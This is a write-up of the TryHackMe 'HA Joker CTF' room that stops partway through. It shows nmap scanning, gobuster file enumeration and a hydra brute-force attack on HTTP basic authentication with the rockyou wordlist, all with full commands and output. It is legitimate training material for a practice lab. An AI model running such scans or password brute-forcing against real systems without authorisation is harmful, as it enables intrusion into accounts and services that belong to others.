# THM: HA Joker CTF

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="../../images/write_ups/try_hack_me/ha_joker_ctf/ha_joker_ctf.jpeg" alt="HA Joker CTF" width="90"/> |
| Room | HA Joker CTF |
| URL | [https://tryhackme.com/room/jokerctf](https://tryhackme.com/room/jokerctf) |
| Difficulty | Easy |

## Concepts/Tools Used



## Room Description

Batman hits Joker.

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

## Enumerate services on target machine.

I run nmap to see what ports are open:
```bash
$ nmap -T4 -n -sC -sV -Pn -v -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-02 04:58 BST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 04:58
Completed NSE at 04:58, 0.00s elapsed
Initiating NSE at 04:58
Completed NSE at 04:58, 0.00s elapsed
Initiating NSE at 04:58
Completed NSE at 04:58, 0.00s elapsed
Initiating ARP Ping Scan at 04:58
Scanning target.thm (10.10.83.112) [1 port]
Completed ARP Ping Scan at 04:58, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 04:58
Scanning target.thm (10.10.83.112) [65535 ports]
Discovered open port 8080/tcp on 10.10.83.112
Discovered open port 22/tcp on 10.10.83.112
Discovered open port 80/tcp on 10.10.83.112
Completed SYN Stealth Scan at 04:58, 2.35s elapsed (65535 total ports)
Initiating Service scan at 04:58
Scanning 3 services on target.thm (10.10.83.112)
Completed Service scan at 04:58, 6.07s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.83.112.
Initiating NSE at 04:58
Completed NSE at 04:58, 0.47s elapsed
Initiating NSE at 04:58
Completed NSE at 04:58, 0.01s elapsed
Initiating NSE at 04:58
Completed NSE at 04:58, 0.01s elapsed
Nmap scan report for target.thm (10.10.83.112)
Host is up (0.000096s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Joker
8080/tcp open  http    Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
MAC Address: 02:17:AC:6D:9E:AB (Unknown)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 04:58
Completed NSE at 04:58, 0.00s elapsed
Initiating NSE at 04:58
Completed NSE at 04:58, 0.00s elapsed
Initiating NSE at 04:58
Completed NSE at 04:58, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.95 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

## What version of Apache is it?

Looking at the nmap output above, Apache is running on ports 80 and 8080. The version is 2.4.29.

## What port on this machine does not need to be authenticated by user and password?

Port 22 is ssh and it requires an ssh key or a username and password combination, so it can't be this port. That means it has to be either port 80 or 8080. I pull up the site in Chrome by navigating to http://target.thm. This page isn't using basic authentication. Since the url is http protocol and a port wasn't specified it defaults to 80. That is the answer.

## There is a file on this port that seems to be secret, what is it?

The question is asking for a specific file. I inspected the html source code and didn't see a commented directory. The html comments on this capture the flag site are comments of the Joker character in movies and shows.

Since it is asking for a file, I run the following command to enumerate files:

```bash
$ gobuster dir -u http://target.thm -w /usr/share/wordlists/dirb/common.txt -x txt,php,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
...
/phpinfo.php          (Status: 200) [Size: 94750]
/secret.txt           (Status: 200) [Size: 320]
...
```

I made sure to include `-x txt,php,zip` to let gobuster know what files I am specifically looking for. The file is secret.txt

## There is another file which reveals information of the backend, what is it?

The other file listed in the output from gobuster is the file that tell a lot about the backend. Going to http://target.thm/phpinfo.php displays all the output from the phpinfo() function. This is something that should not make it to production.

## When reading the secret file, ee find with a conversation that seems contains at least two users and some keywords that can be interesting, what user do you think it is?

I download the secret.txt file with the following command:

```bash
$ wget http://target.thm/secret.txt
```

Then I output the text in this file by running the following:

```bash
$ cat secret.txt 
Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
```

There are a lot of hints in this conversation. I see two usernames batman and joker. Batman hints that he can break Joker with a rock. This is a reference that using the rockyou.txt wordlist will crack the joker. This means that joker is the user and their password is in the rockyou.txt file.

## What port on this machine needs to be authenticated by Basic Authentication mechanism?

Going back to the output from nmap, there is only one port that runs http left. I check port 8080 by going to http://target.thm:8080. It uses basic authentication.

## At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password?

I am going to use hydra with the joker username and the rockyou.txt wordlist to log into the site on port 8080. I let hydra know that I am trying to break basic authentication by using the http-get protocol in the command. Here is the command I used:

```bash
$ hydra -l joker -P /usr/share/wordlists/rockyou.txt http-get://target.thm:8080
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-02 17:46:27
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-get://target.thm:8080/
[8080][http-get] host: target.thm   login: joker   password: REDACTED
1 of 1 target successfully completed, 1 valid password found
```

Hydra very quickly found the password and I am able to log into the site.

## Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory?

